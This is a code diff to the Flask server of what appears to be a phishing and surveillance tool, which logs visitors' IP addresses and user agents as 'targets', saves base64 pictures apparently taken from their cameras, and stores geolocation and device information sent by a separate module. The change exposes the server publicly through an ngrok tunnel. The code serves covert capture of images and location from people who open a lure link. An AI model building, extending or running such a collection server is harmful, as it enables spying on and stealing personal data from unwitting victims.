@@ -13,6 +13,11 @@ class server:
 		self.param = param # For checking if multiple modules were passed or not
 		self.page = page
 		self.conn_num = 0
+		if config.use_ngrok:
+			self.url = config.ngrok_url.replace('http://', 'https://')
+		else:
+			self.url = 'http://127.0.0.1:5000'
+		print(f'\n\n[*] SERVER STARTED at {self.url}\n')
 		self.main()
 
 	def write_target_logs(self, data):
@@ -46,9 +51,8 @@ class server:
 			Here you can create routes for your modules for saving data.
 		'''
 
-		@app.route('/')
+		@app.route('/',methods=['POST','GET'])
 		def home():
-			print('\n\n[*] SERVER STARTED at http://127.0.0.1:5000\n')
 			self.write_target_logs(str(self.conn_num)+'. '+str(request.user_agent)+': '+str(request.remote_addr)+'\n\n')
 			print(f'\n{self.conn_num+1} [+] {config.GREEN}INCOMING REQUEST FROM {request.remote_addr}:- {config.WHITE}{config.YELLOW} {request.user_agent}{config.WHITE}\n')
 			self.conn_num+=1
@@ -63,6 +67,7 @@ class server:
 					f.write(b64(request.get_json().replace('data:image/jpeg;base64,','')))
 					print(f'\n{self.conn_num+1} [+] {config.GREEN}PIC RECEIVED FROM {request.remote_addr}:- {config.WHITE}{config.YELLOW} {request.user_agent}{config.WHITE}\n')
 				return '200','OK'
+
 		@app.route('/saveinfo',methods=['POST','GET']) # This is where the geolocation_device_info module sends its data
 		def saveinfo():
 			if request.method == 'POST':
@@ -72,6 +77,7 @@ class server:
 					f.write(request.get_json())
 					print(f'\n{self.conn_num+1} [+] {config.GREEN}INFO RECEIVED FROM  {request.remote_addr}:- {config.WHITE}{config.YELLOW} {request.user_agent} {config.WHITE}{config.WHITE}\n')
 				return '200','OK'
+
 		@app.route('/saverror',methods=['POST','GET']) # All modules should send error logs here
 		def saverror():
 			if request.method == 'POST':
